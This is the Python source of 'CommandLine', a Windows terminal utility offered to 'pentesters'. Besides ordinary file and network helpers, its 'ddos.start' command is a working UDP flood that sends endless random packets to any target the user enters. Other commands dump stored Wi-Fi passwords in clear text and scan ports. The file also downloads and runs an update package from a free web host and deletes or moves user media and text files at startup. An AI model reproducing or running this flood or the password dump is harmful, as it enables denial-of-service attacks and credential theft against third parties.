from pprint import pp
from typing import no_type_check
from colorama import *
from time import sleep
import os
import shutil
from time import sleep
import requests
import wget
import os
from getpass import getuser
from zipfile import ZipFile
from plyer import notification

def notification_c(fmessage):
 try:
    notification.notify(
        title = 'CommandLine',
        message = fmessage,
        app_icon = 'icons\\commandline.ico',
        timeout = 10,
    )
 except:
     pass

def usercommand(self):
    try:

        if z == "about":
            # Shows About Info
            print("""CommandLine is an Opensource Program by Muhammad Sami Furqan.""")

        # Shows License Info.
        elif z == "license":
            import getpass
            print(f"""
This Software is licensed to {getpass.getuser()}.
|------------------------------------------------------|   
|              LICENSE INFO                            |
|              -------------                           |    
|-> From Aisoft-co.                                    |
|-> CLI Based Software.                                |  
|-> Open-Source.                                       |
|-> Version 2.0.8                                      |
|-> Language : Python3.                                | 
|-> For Pentesters and for Ethical Hackers.            | 
|-> Type : Terminal.                                   |
|------------------------------------------------------|
""")
        # General commands
        # whoami -> Tells The Name of the current user.
        elif z == "whoami":
            import getpass
            print(getpass.getuser())

        # Exiting Console

        elif z == "exit" or z == "e":
            print("Exiting Commandline")
            quit()

        # For Clearing Console
        elif z == "clear" or z == "cls":
            import os
            # Checks about OS "REQUIRED FOR CLEARING"
            def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
            clear()  # Clears Console

        # For dislaying day and time.
        elif z == "d/t":
            import datetime
            dt = datetime.datetime.now()
            print(dt)

        # For listing directories:
        elif z == "ls":
            import os

            files = [f for f in os.listdir('.')]
            for f in files:
                print(f)
        # Returns files and directories as a list.
        elif z == "ls -a".lstrip():
            import os
            from os import listdir
            from os.path import isfile, join

            cwd = os.getcwd()
            onlyfiles = [os.path.join(cwd, f) for f in os.listdir(cwd) if
                         os.path.isfile(os.path.join(cwd, f))]
            print(onlyfiles)

        # Create a new file
        elif z == "create.file":

            import os
            a = input("Enter file name: ")
            b = input("Enter Extension: ")
            if os.path.isfile(a+b):
                print(f"{a+b} <-- File Exists")
            else:
                newf = open(str(a)+str(b), 'w')
                print(
                    f"The file named {str(a)+str(b)} is created successfully!")

        #  Delete a file:
        elif z == "del.file":

            #!/usr/bin/python
            import os

            ## Get input ##
            myfile = input("Enter file name to delete: ")

            ## Try to delete the file ##
            if myfile == "CommandLine.py":
                askdelfile = input(
                    "Do you want to delete this console from pc")
                if askdelfile == "yes":
                    print("ok removing..")
                    os.remove(myfile)
                else:
                    pass
            try:
                os.remove(myfile)
                print(f"The file named {myfile} is deleted successfully!")
            except OSError as e:  # if failed, report it back to the user ##
                print("Error: %s - %s." % (e.filename, e.strerror))

        # Updating a file in python
        elif z == "update.file":
            try:
                User3 = input("Enter file name: ")

                k = open(str(User3), 'a')
                usrinp = input("Enter Text: ")
                k.write(usrinp+"\n")
                k.close()
                print(f"The File named {User3} is updated successfully!")
            except:
                print(f"{User3} <-- File Not Found!")
        # Rename a file
        elif z == "rename.file":
            try:
                import os

                oldfilename1 = input("Enter Old File Name: ")
                oldextensionname = input("Enter Old File Exetension: ")
                newfilename1 = input("Enter New File Name: ")
                newextensionname = input("Enter New Extension Name: ")
                os.rename(oldfilename1+oldextensionname,
                          newfilename1+newextensionname)
                print(
                    f"The file named {oldfilename1+oldextensionname} has been successfully updated to {newfilename1+newextensionname}!")
            except:
                print(f"{oldfilename1}{oldextensionname} <-- File Not Found!")

        # get ip from host
        elif z == "host.getip":
            try:
                import socket
                askhost = input("Enter Host URL: ")
                convert_host = socket.gethostbyname(askhost)
                print(f"The ip address of Host: {askhost} is {convert_host}")
            except:
                print(f"{askhost} host ip address not found")
        # get host name from ip
        elif z == "ip.get":
            try:
                import socket
                askusrforip = input("Enter Host IP : ")
                hostipcheck = socket.gethostbyaddr(askusrforip)
                print(f"The Host of this Ip is {hostipcheck}")
            except socket.gaierror:
                print("Unknown error")
            except:
                print(f"{askusrforip} host not found")

        # ipconfiguration
        elif z == "ipcon.all":

            import subprocess
            ipcon_out = subprocess.check_output(
                "ipconfig /all").decode('utf-8')
            print(ipcon_out)

        # Gb to Mb convertor
        elif z == "gb.mb":
            user = int(input("Enter Number in GB : "))
            if user == "1":
                print("1024")
            else:
                cdv = 1024*user
                print(cdv)

        # Mb to Gb Convertor:
        elif z == "mb.gb":
            valmb = int(input("Enter Number in MB : "))
            cf = valmb*0.0009765625
            print(cf)

        # For opening url in the browser
        elif z == "net.browse":
            import webbrowser
            thUser = input("Enter Web Url :")
            webbrowser.open(thUser)
            print(f"Opening {thUser} in Browser.")
        # Pinging Websites
        elif z == "lan.ping":
            from os import system
            Enterurl = input("Enter URL :")
            system("ping " + Enterurl)

        # Ping Constantly
        elif z == "ping.t":
            s2e4 = input("Do you want to Ping Websites :")
            if s2e4 == "y":
                try:
                    import subprocess
                    askusrtouser = input("Enter Website url : ")
                    prpc342 = subprocess.check_output(
                        "ping "+askusrtouser+" -t").decode('utf-8')
                    print(prpc342)
                except:
                    KeyboardInterrupt == print("ok")
        # This will run windows terminal.
        elif z == "terminal":
            import os
            os.system("cmd")
        # port ip scanner:=
        elif z == "lanport/scan.ip":
            import socket
            import ipaddress
            import re
            port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
            port_min = 0
            port_max = 65535
            open_ports = []
            while True:
                ip_add_entered = input(
                    "Please enter the ip address that you want to scan: ")
                try:
                    ip_address_obj = ipaddress.ip_address(ip_add_entered)
                    print("You entered a valid ip address.")
                    break
                except:
                    print("You entered an invalid ip address")
            while True:
                print(
                    "Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
                port_range = input("Enter port range: ")
                port_range_valid = port_range_pattern.search(
                    port_range.replace(" ", ""))
                if port_range_valid:
                    port_min = int(port_range_valid.group(1))
                    port_max = int(port_range_valid.group(2))
                    break
                for port in range(port_min, port_max + 1):
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(0.5)
                            s.connect((ip_add_entered, port))
                            open_ports.append(port)
                    except:
                        pass
            for port in open_ports:
                print(f"Port {port} is open on {ip_add_entered}.")
        elif z == "nocolor":
            import colorama
            print(f"{Fore.RESET}")

        # check network speedtest
        elif z == "net.speedtest":
            import speedtest

            notification_c("Testing Your Network Speed")
            def getNetSpeed():
                import speedtest
                tester = speedtest.Speedtest()
                print("Searching For The Best Server...")
                # Check for the best servers
                bestServer = tester.get_best_server()
                print(
                    f'Selecting {bestServer["host"]} located in {bestServer["country"]},{bestServer["name"]}')
                # Now code for Checking Downloading Speed.
                print("Checking Downloading Speed...")
                downloadSpeed = tester.download()
                print("Done!")
                # Now code for checking Uploading Speed.
                print("Checking Uploading Speed...")
                uploadSpeed = tester.upload()
                print("Done!")
                ping = tester.results.ping
                print('Results :')
                print(
                    f'-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s')
                print(f'-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s')
                print(f'-Ping : {ping :.2f} ms')
                notification_c(f"""Here are SpeedTest Results
-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s
-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s
-Ping : {ping :.2f} ms""")
            for i in range(1):
                print(getNetSpeed())
        # Winver
        elif z == "win.ver":
            import subprocess
            proc332 = subprocess.check_output("winver").decode('utf-8')

#------------------------Hacking Scripts----------------------------#
# Used Scripts like Ddos and more From github.                      #
#-------------------------------------------------------------------#
        # DDOS Attack Script
        elif z == "ddos.start":
            import sys
            import os
            import time
            import socket
            import random
            # Code Time
            from datetime import datetime
            now = datetime.now()
            hour = now.hour
            minute = now.minute
            day = now.day
            month = now.month
            year = now.year

            ##############
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            #############
            bdafa = input("""Select one
[A] DDoS using an ip address (if you already have an ip address)
[B] DDoS using host (if you dont have an ip address)

""")
            if bdafa == "A":

                try:
                    ip = input("Enter Ip address: ")

                    try:
                        port = int(input("Port       : "))
                    except:
                        print("Dont use strings in port!")

                    print(f"Starting an DDoS Attack on {ip}")
                    print("[                    ] 0% ")
                    time.sleep(1)
                    print("[=====               ] 25%")
                    time.sleep(1)
                    print("[==========          ] 50%")
                    time.sleep(1)
                    print("[===============     ] 75%")
                    time.sleep(1)
                    print("[====================] 100%")
                    time.sleep(1)
                    notification_c(f"Started DDoS Attack at {ip} on port {port}")
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip, port))
                        sent = sent + 1
                        port = port + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip, port))
                        if port == 65534:
                            port = 1

                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("\nok") , notification_c(f"The DDoS Attact on {ip} and port {port} has been stopped due to keyboard interupt")
                except socket.gaierror as axs:
                    socket.gaierror == print(f"{ip} <-- Wrong Ip address")

            else:
                try:
                    user13232 = input("Enter Host : ")
                    ip2 = socket.gethostbyname(user13232)
                    port2 = int(input("Port       : "))
                    print(
                        f"Starting an DDoS Attack on Host {user13232} ip address is {ip2}:")
                    notification_c(f"Started DDoS Attack at {user13232} ip address is {ip2}")
                    sent = 0
                    while True:
                        sock.sendto(bytes, (ip2, port2))
                        sent = sent + 1
                        port2 = port2 + 1
                        print("Sent %s packet to %s throught port:%s" %
                              (sent, ip2, port2))
                        if port2 == 65534:
                            port2 = 1
                except KeyboardInterrupt as exception:
                    KeyboardInterrupt == print("\nProcess Stopped - REASON : KeyBoard Interrupt") , notification_c(f"The DDoS Attact on {user13232} with the ip address of {ip2} has been stopped due to keyboard interupt")
                except socket.gaierror:
                    socket.gaierror == print(
                        f"{user13232} <-- Host Not Found + No ip address Found ")

        # app updater
        elif z == "update.commandline":
            commandlineupdate()
            pass
        # gitclonner
        elif z == "git.clone":
            from git import Repo
            import os
            ask_abt_dir = input("Enter the Location(not gitlink): ")
            ask_abt_url = input("Enter repository link(git link): ")
            ask_folder_name = input(
                "Enter the folder name(new folder to store files): ")
            combine_a = ask_abt_dir+"\\"+ask_folder_name
            Repo.clone_from(ask_abt_url, combine_a)
            notification_c(f"The Repo {ask_abt_url} is cloned the files are located on {combine_a}")
        # Scan fix kit 
        elif z == "scanfix":
            import os
            from time import sleep
            import getpass
            import shutil
            init(convert=True)
            os.system("cls")
            print(f"""{Fore.BLUE}Select option:
            [a] Scan&fix system. [Scans and fix the broken files].
            [b] Clear temp files. [Clears the temporary files].
            [c] Just verify the system. [Just verifies the system files & let you know if something is broken].
                      """)
            print(f"{Fore.RESET}")
            option = input(f"{Fore.RED}=> ")
            # this takes an input from the user and checks if it is a valid option.
            if option == "a":
                # if the user selects option a, the program will scan and fix the broken files.
                try:
                    notification_c("The Auto Scan Fix is Started.")
                    sleep(2)
                    print(f"{Fore.RED} This process could take some time.")
                    # sfc/scannow is the command that scans and fix the files automatically.
                    os.system("sfc/scannow")
                    notification_c("The System Scan and Fix is Completed")
                # if the user presses ctrl+c, the program will ask for stopping the process.
                except KeyboardInterrupt:
                    ask_stop_scan = input(
                        " Do you want to stop the scan?[y/n]: ")
                    if ask_stop_scan == "y":
                          notification_c("The ScanFix Process has been stoped.")
                    else:
                        pass

            elif option == "b":
                sleep(2)
                print(f"{Fore.RED}This process could take some time.")
                sleep(1)
                print(f"{Fore.BLUE}Checking Temp folders...")
                sleep(1)
                print(f"{Fore.BLUE}Cleaning c:\windows\\temp...")
                try:
                    # the directory that will be deleted.
                    del_dir = r'c:\windows\temp'
                    # this deletes the directory with ignored errors.
                    shutil.rmtree(del_dir, ignore_errors=True)
                except:
                    print(f"{Fore.RED}Unknown Error was Found!")
                print(f"{Fore.RED}Cleaning Completed!")
                sleep(1)
                print(f"{Fore.BLUE}Cleaning c:\\AppData\\Local\Temp...")
                try:
                    getusr = getpass.getuser()  # this will get the current user
                    # directory that will be deleted.
                    del_app_cache = r'c:\Users\%s\AppData\Local\Temp' % getusr
                    # this will delete the directory with ignored errors.
                    shutil.rmtree(del_app_cache, ignore_errors=True)
                except:
                    print(f"{Fore.RED}Unknown Error was Found!")
                print(f"{Fore.RED}Cleaning Completed!")
                notification_c("The Temp folders are cleaned now!")
                usr_ask_log = input(
                    "Do you want to save a log of the cleaning?[y/n]: ")
                if usr_ask_log == "y":
                    try:
                        # this will create a log file in the same directory as the program.
                        with open("logs.txt", "a") as f:
                            import datetime
                            f.write(
                                "Logs Created by scanfix kit - CommandLine\n")
                            f.write("==========================\n")
                            f.write(
                                f"The date of creation : {datetime.datetime.now()}\n")
                            f.writelines("""Files that are not deleted:\n""")
                            f.writelines(
                                'Files in c:\\Users\\UserName\\AppData\\Local\\Temp\n')
                            f.close()
                            with open("logs.txt", "a") as f:
                                # basically with the help of this code, the program will write the files that are not deleted in the Temp folders.
                                # both temp folder and the AppData\\Local\\Temp folder. will be written in the log file.
                                files_get = os.listdir(
                                    r'c:\Users\%s\AppData\Local\Temp' % getusr)
                                f.close()
                                for file in files_get:
                                    f = open("logs.txt", "a")
                                    f.writelines(file+"\n")
                                    f.close()
                                f = open("logs.txt", "a")
                                f.write("\n")
                                f.write("==========================\n")
                                f.write('\n')
                                f.write("==========================\n")
                                f.close()
                                notification_c("The Logs has been saved at the current Directory")
                            f = open("logs.txt", "a")
                            f.writelines('Files in c:\windows\\temp\n')
                            with open("logs.txt", "a") as f:
                                files_get1 = os.listdir(r'c:\\windows\\temp\\')
                                f.close()
                                for file in files_get1:
                                    f = open("logs.txt", "a")
                                    f.writelines(file+"\n")
                                    f.close()
                                f = open("logs.txt", "a")
                                f.write("\n")
                                f.write("==========================\n")
                    except FileNotFoundError:
                        pass
            elif option == "c":
                # if the user selects option c, the program will scans the broken files.
                try:
                    notification_c("The Auto Scan is Started.")
                    sleep(2)
                    print(f"{Fore.RED} This process could take some time.")
                    # sfc/verifyonly is the command that scans files.
                    os.system("sfc/verifyonly")
                # if the user presses ctrl+c, the program will ask for stopping the process.
                    notification_c("The System Scan is Completed")                    
                except KeyboardInterrupt:
                    ask_stop_scan2 = input(
                        " Do you want to stop the scan?[y/n]: ")
                    if ask_stop_scan2 == "y":
                       notification_c("The System Scan is Stoped")               
                    else:
                        pass
       # This will show the current running tasks
        elif z == "tasks.show":
            import os
            show_tasks = os.popen('tasklist').read()
            print(show_tasks)
        elif z == "tasks.kill":
            import os
            user_taskkill = input("Enter Task Name to kill : ")
            os.system("taskkill /im "+user_taskkill)
#-------------------Hacking Scripts---------------------------------#
        # This will detect IP's and return with the info of it
        elif z == "ip.info":
            import requests
            init(convert=True)
            print(f"""{Fore.BLUE}Select Options:
[A] Track by IP Address - Example [111.111.11.1]
[B] Track by Host Name - Example [www.example.com]
[C] Back
""")
            print(
                Fore.RED+"\t\t\t\t\t *You can use 'list' command to see all the options*")

            command = input(f"{Fore.RED}{getuser()}$: ")
            if command == "A":
                # This takes ip from the user and get info from http://ip-api.com/json/{0}
                print(Fore.RESET)
                user_ip = input(Fore.BLUE+"ENTER IP ADDRESS: ") #takes the input
                url = "http://ip-api.com/json/{0}"
                response = requests.get(url.format(user_ip)).json()
                print(Fore.RESET)
                for key in response:
                    print(Fore.GREEN +
                          "{0: <15} - {1}".format(key, response[key]))
            elif command == "B":
                # This does the same thing but the difference is that it takes host and convert it into ip address and return the info
                user_host = input("ENTER HOST NAME: ")
                Host_conv = requests.get(
                    f"http://ip-api.com/json/{user_host}").json()
                for key2 in Host_conv:
                    print("{0: <15} - {1}".format(key2, Host_conv[key2]))
                    print("\n")
            #This clears the console 
            elif command == "cls":
                os.system("cls")
            # This prints the options that are available 
            elif command == "list":
                print(f"""{Fore.BLUE}Availaible Options:
         [A] Track by IP Address - Example [111.111.11.1]
         [B] Track by Host Name - Example [www.example.com]
         [C] Exit (Exits the program)
         """)
            elif command == "C":
                print(Fore.RESET)
                pass
            else:
                print(Fore.RESET)
                print(Fore.RED+"Wrong Command! Try Again.")
        # download youtube videos
        elif z == "pkg.youtube": # This basically uses a module called youtube_dl 
                                 # to download youtube videos 
            try:
                def youtube_title_finder():
                    import requests
                    from bs4 import BeautifulSoup
                    resp = requests.get(zxt)
                    s = BeautifulSoup(resp.text , 'html.parser')
                    global title
                    title = s.find("title").text
                    title = title.replace("- YouTube" , "")
                    return title
              # importing module
                import youtube_dl
                ydl_opts = {}

                def dwl_vid():
                    youtube_title_finder()
                    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                        mess1 = "The youtube video is being downloaded\n"+ title 
                        notification_c(mess1)
                        ydl.download([zxt])
                        mess4 = "The youtube video is successfully downloaded\n"+ title 
                        notification_c(mess4)

                channel = 1
                while (channel == int(1)):
                    link_of_the_video = input("Enter Video URL: ")
                    zxt = link_of_the_video.strip()

                    dwl_vid()
                    channel = int(
                        input("Enter 1 if you want to download more videos \nEnter 0 if you are done : "))

            except KeyboardInterrupt as exception:
                KeyboardInterrupt == notification_c("The YouTube Download is Stopped\n" + title)

                # Mp3 youtube downloader
        elif z == "pkg.youtube.mp3":
          # importing packages
            from pytube import YouTube
            import os
            
            # url input from user
            yt = YouTube(
                str(input("Enter Video URL : ")))

            # extract only audio
            video = yt.streams.filter(only_audio=True).first()

            # check for destination to save file
            print("Enter the destination (leave blank for current directory)")
            destination = str(input(">> ")) or '.'

            # download the file
            mess3 = "The youtube MP3 is being downloaded\n"+ title 
            notification_c(mess3)
            out_file = video.download(output_path=destination)
            
            mess2 = "The youtube MP3 is successfully downloaded\n"+ title 
            notification_c(mess2)
            # save the file
            base, ext = os.path.splitext(out_file)
            new_file = base + '.mp3'
            os.rename(out_file, new_file)

            # result of success
            print(yt.title + " has been successfully downloaded.")
        # get files from internet
        elif z == "pkg.download":
            try:
                import wget
                url1 = input("Enter file url: ")
                while True:
                    try:
                        os.mkdir("My Files")
                        break
                    except FileExistsError:
                        break
                wget.download(url1 , out="My Files")
                print("Download is completed successfully")
            except:
                print(f"{url1} <-- Wrong Package!")

        # open files
        elif z == "open.file": # This uses simple os module to start files.
            try:
                import os
                askusrabtfile = input("Enter File Name: ")
                os.startfile(askusrabtfile) # os.startfile start file by taking the location or name.
                print(f"The file named {askusrabtfile} is opened successfully")
            except:
                print(f"{askusrabtfile} <-- File not Found!")

        # Shutdown the computer
        elif z == "shutdown.s": # This use os module to shutdown computer.
            try:
                import os
                oc = input("Do you want to Shutdown this device y or n : ")
                if oc == "y":
                    os.system("shutdown /s") # uses cmd to shutdown computer by os.system("Shutdown /s").
                    notification_c("Your PC will shutdown soon.")
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # restarts the commputer
        elif z == "restart.s": # This use os module to restart computer.
            try:
                import os
                g = input("Do you want to restart this device y or n: ") 
                if g == "y":
                    os.system("shutdown /r") # uses cmd to restart computer by os.system("Shutdown /r").
                    # /r stands for restart.
                    notification_c("Your PC will Restart soon.")
                elif g == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # logout from the ccomputer.
        elif z == "logout.s":  # This use subprocesse module to logout computer.
            try:
                import subprocess
                fl = input("Do you want to logout y or n : ")
                if fl == "y":
                    subprocess.check_output("shutdown /l").decode('utf-8') 
                    notification_c("Your PC will Logout soon.")
                elif z == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # Remote shutdown the computer:
        elif z == "remote.shutdown": # This use subprocesse module to Remote shutdown computer.
            try:
                import subprocess
                userwin = input(
                    "Do you want to remotely shutdown all the computers y or n :")
                if userwin == "y":
                    subprocess.check_output("shutdown -i").decode('utf-8')
                elif userwin == "n":
                    print("Ok")
                else:
                    print("Error")
            except:
                print("Error running this command")

        # run python commands
        elif z == "python.run":
            import os
            os.system("python")

        # renew all adapters
        elif z == "wlan.renew":
            import subprocess
            proc3 = subprocess.check_output("ipconfig /renew").decode('utf-8')
            print(proc3)
            notification_c("All Adapters are renewed successfully.")

        # Release all adapters
        elif z == "wlan.release":
            import subprocess
            proc34 = subprocess.check_output(
                "ipconfig /release").decode('utf-8')
            print(proc34)
            notification_c("All Adapters are released successfully.")

        # Check if Url exists
        elif z == "check.urlexists":
            import requests
            try:
                askusrabturlex = input("Enter Url:")
                response = requests.get("http://"+askusrabturlex)
             
            except requests.ConnectionError as exception:
                print(f"{askusrabturlex} Not Exists!")
        elif z == "update.info":
            from bs4 import BeautifulSoup
            import requests

            review_url = "https://pastebin.com/DrX3LbR9"
            resp = requests.get(review_url)
            soup = BeautifulSoup(resp.text , 'html.parser')
            find_info  = soup.find("textarea").text
            print(find_info)


        # Show wifi passwords
        elif z == "wlan/show.pass":
            try:
                import subprocess
                import re
                command_output = subprocess.run(
                    ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                profile_names = (re.findall(
                    "All User Profile     : (.*)\r", command_output))
                wifi_list = []
                if len(profile_names) != 0:
                    for name in profile_names:
                        wifi_profile = {}
                        profile_info = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
                    if re.search("Security key           : Absent", profile_info):
                        pass
                    else:
                        wifi_profile["ssid"] = name
                        profile_info_pass = subprocess.run(
                            ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                        password = re.search(
                            "Key Content            : (.*)\r", profile_info_pass)
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            wifi_profile["password"] = password[1]
                        wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
                for x in range(len(wifi_list)):
                    print(wifi_list[x])
                    notification_c(f"The Passwords are found! {wifi_list[x]}")
                    savepass = input(
                        "Do you want to save these passwords y or n :")
                    if savepass == "y":
                        f = open('WlanPasswords.txt', 'w')
                        f.write(str(wifi_list[x]))
                        f.close
                        print(
                            "All the passwords are saved! Check WlanPasswords.txt for saved passwords")
                    else:
                        print("Ok")
            except:
                print("Unknown Error was Found!")
        # show script commands
        elif z == "show.scripts":
            print(""" The Availaible scripts are :
|------------------------------------------------------------|
|[*] "scanfix" starts windows fix kit.                       |
|[*] "ddos.start" Starts an ddos Attack.                     |                                                       
|[*] "host.getip" Get ip address of host by host url.        |      
|[*] "ip.get" Gets host name from ip.                        |
|[*] "ip.info" To get IP info.                               |
|[*] "wlan/show.pass" Show Wifi passwords.                   |
|[*] "lanport/scan.ip" to scan ip address.                   |
|------------------------------------------------------------|

""")

        # show windows commands:
        elif z == "shutdown/?":
            print("""
|-----------------------------------------------|
|[*] "shutdown.s" to shutdown this pc.          |
|[*] "restart.s" to restart this pc.            |
|[*] "remote.shutdown" to remoteley shutdown pc.|
|[*] "logout.s" to logout from this pc.         |
|-----------------------------------------------|
""")

        # Show all commands:
        elif z == "showall/?":

            print("""
|--------------------------------------------------------------------|
|[*] "root.showip" for showing ip adrees of this device.             |
|[*] "wifi/nby" for all nearby located wifi.                         |
|[*] "wlan/show.pass" for getting all the Wifi Passwords.            |
|[*] "lan.ping" for pinging websites.                                |
|[*] "lanport/scan.ip" to scan ip addresses.                         |
|[*] "check.urlexists" to check if url exists.                       |
|[*] "net.browse" to open a website in a browser.                    |
|[*] "ls" to list files currently stored in this directory.          |
|[*] "ls -a" to list files currently stored in this directory.       |
|[*] "terminal" to use Windows CMD in this Terminal.                 |
|[*] "python.run" to run python if installed.                        |
|[*] "wlan.renew" to renew all adapters.                             |
|[*] "wlan.release" for releasing all the adapters.                  |
|[*] "net.speedtest" for testing network speed.                      |
|[*] "ipcon.all" for ip configuaration.                              |
|[*] "win.ver" to show current version of windows.                   |
|[*] "mb.gb" for converting Megabytes into Gigabytes .               |
|[*] "gb.mb" for converting Gigabytes into Megabytes.                |  
|[*] "update.commandline" for updating commandline.                  |
|[*] "git.clone" for cloning git repositories.                       |
|[*] "nocolor" clears the color sets to default.                     |
|[*] "tasks.show" Show all running tasks.                            |
|[*] "tasks.kill" Kills the specified task.                          |
|--------------------------------------------------------------------|
""")

        # Show ip address of this Machine
        elif z == "root.showip":
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            print("The ip address of this machine is "+s.getsockname()[0])
            s.close()
        elif z == "calc":
            print(
                "Use [*] for Multiplication, [+] for Sum , [/] for Divivde , [-] for Sutract Eg : 23 + 12")
            calcin = input("Caculate : ")
            print(eval(calcin))
        # Show website ip addresses
        elif z == "net/showwebip":
            try:
                import socket as s
                host = input("Enter web URL:")
                ip = s.gethostbyname(host)
                print('The IP Address of ' + host + ' is: ' + ip)
            except s.gaierror:
                s.gaierror == print(f"{host} <-- Host Not Found!")

        # Wifi nearby:
        elif z == "wifi/nby":
            import subprocess
            devices = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'network'])
            devices = devices.decode('ascii')
            devices = devices.replace("\r", "")
            print(devices)
            notification_c(f"The wifi devices are found!")
        # if users input is null or nothing.
        elif z == "":
            pass
        elif z == KeyboardInterrupt:
            quitdialogue = input("Do you want to quit? y or n : ")
            if quitdialogue == "y":
                print("Quitting...")
                quit()
        # Help Commands:
        elif z == "help" or z == "?":
            print("""OPTIONS TO CHOOSE WITH
|------------------------------------------------------|
|Basic Commands :-                                     |
|[*] "whoami" to see about the user.                   |
|[*] "create.file" to Create a new file.               |
|[*] "del.file" to delete a file.                      |
|[*] "rename.file" to rename a file.                   |
|[*] "open.file" to open files.                        |
|[*] "calc" Calculator - Basic + Advanced              |
|[*] "update.file" to update the file.                 |
|[*] "exit" to exit the console.                       | 
|[*] "cls" or "clear"  to clear Console.               |
|[*] "pkg.download" to download files from internet.   |
|[*] "pkg.youtube" to download videos from youtube.    |
|[*] "pkg.youtube.mp3" to download audio from youtube. |
|[*] "showall/?" to show all commands.                 |
|[*] "show.scritps" to show all scripts.               |
|[*] "shutdown/?" to show shutdown commands.           |
|[*] "update.info" to the info of the latest update.   |
|------------------------------------------------------|""")

        # If user will input a  wrong command:
        else:
            print("Command not found! If you need Help use 'help' or '?'")
            return z
    except:
        user_input = input("Do you want to exit the console? y or n :")
        if user_input == "y":
            print("Exiting console...")
            exit()


def commandlineupdate():
    from time import sleep
    import requests
    from bs4 import BeautifulSoup

    Program_Ver = "2w.0e.8s"

    def updateCheck():
        versionReturn()
        print("Checking version info...")
        sleep(1)
        coderp = {
            'w': ' ',
            'e': ' ',
            's': ' ',
        }
        pr_ver_replace = Program_Ver.translate(str.maketrans(coderp))
        ver_rem_strip = pr_ver_replace.replace(' ', '')
        web_ver_replace = version_check.translate(str.maketrans(coderp))
        web_rem_strip = web_ver_replace.replace(' ', '')
        print(f"The Latest version is : {web_rem_strip}")
        sleep(0.5)
        print(f"Program version is    : {ver_rem_strip}")
        sleep(1)
        review_url = "https://pastebin.com/WePYbH80"
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        old_ver_check = soup.find("textarea").text
        if Program_Ver in old_ver_check:
            print("The Version is Latest + No New Updates are Avalaible")
        else:
            print("The version is not latest")
            oldVersionCheckdownload()

    def versionReturn():
        review_url = "https://pastebin.com/WePYbH80"
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        global version_check
        version_check = soup.find("textarea").text
        return version_check

    def newVerDetect():
        versionReturn()
        coderp = {
            'w': ' ',
            'e': ' ',
            's': ' ',
        }
        web_ver_replace = version_check.translate(str.maketrans(coderp))
        global web_rem_strip2
        web_rem_strip2 = web_ver_replace.replace(' ', '')
        return web_rem_strip2

    def oldVersionCheckdownload():
        newVerDetect()
        import wget
        import shutil
        import os
        import zipfile
        review_url = "https://pastebin.com/KMGwq42S"
        versionReturn()
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        old_ver_check = soup.find("textarea").text
        if Program_Ver in old_ver_check:
            print(f"New Update is Found -> {web_rem_strip2}")
            notification_c(f"The new update is Found -> {web_rem_strip2} ")
            ask_to_update = input("Do you want to update? (Y/N): ")
            if ask_to_update == "Y" or ask_to_update == "y":
                wget.download(
                    "https://allpetsworld.000webhostapp.com/commandlinedownload/CommandLine.zip")
                print("\n")
                print(f"Creating a New Directory named CommandLineDownload...\n")
                sleep(1)
                os.mkdir("CommandLineDownload")
                sleep(2)
                print("Extracting the Downloaded files...\n")
                current_dir = os.getcwd()
                current_dir23 = current_dir+"\\CommandLine.zip"
                ext_loc = current_dir + "\\CommandLineDownload"
                with zipfile.ZipFile(current_dir23, 'r') as zip_ref:
                    zip_ref.extractall(ext_loc)
                sleep(1)
                print("Extraction Successful\n")
                sleep(1)
                print("Running the Setup File...\n")
                sleep(1)
                try:
                    os.startfile(
                        current_dir+"\\CommandLineDownload\\AutoInstall.bat")
                    exit()
                except:
                    try:
                        os.startfile(
                            current_dir+"\\CommandLineDownload\\CommandLine.exe")
                        sleep(10)
                        os.startfile(
                            current_dir+"\\CommandLineDownload\\Commands.chm")
                    except OSError as e:
                        print("Opertation cancelled\n")
                ask_to_delete = input(
                    "Do you want to delete the downloaded files? (Y/N): ")
                if ask_to_delete == "Y":
                    shutil.rmtree("CommandLineDownload")
                    try:
                        os.remove("CommandLine.zip")
                    except:
                        print("Deletion Successful\n")
                        sleep(2)
                else:
                    print("Deletion Cancelled\n")

            else:
                print(
                    f"OK -- Skipped Update {web_rem_strip2} | -> use 'update.commandline' to Update to Latest Version\n")

    updateCheck()


if __name__ == "__main__":
    try:
        print("Analyzing CommandLine Directory")
        try:
            shutil.rmtree("CommandLineDownload")
        except:
            pass
        try:
            while True:
             try:
                os.mkdir("My Files")
                break
             except FileExistsError:
               break
            import os
            dir1 = [f for f in os.listdir('.')]
            for f in dir1:
                if f.endswith('.txt'):
                    try:
                        shutil.move(f , 'My Files')
                    except:
                        os.remove(f)
                elif f.endswith('.mp3'):
                    try:
                        shutil.move(f , 'My Files')
                    except:
                        os.remove(f)
                elif f.endswith('.mp4'):
                    try:
                        shutil.move(f , 'My Files')
                    except:
                        os.remove(f)
                elif f.endswith('.part'):
                 os.remove(f)
                elif f.endswith('.tmp'):
                 os.remove(f)
        except:
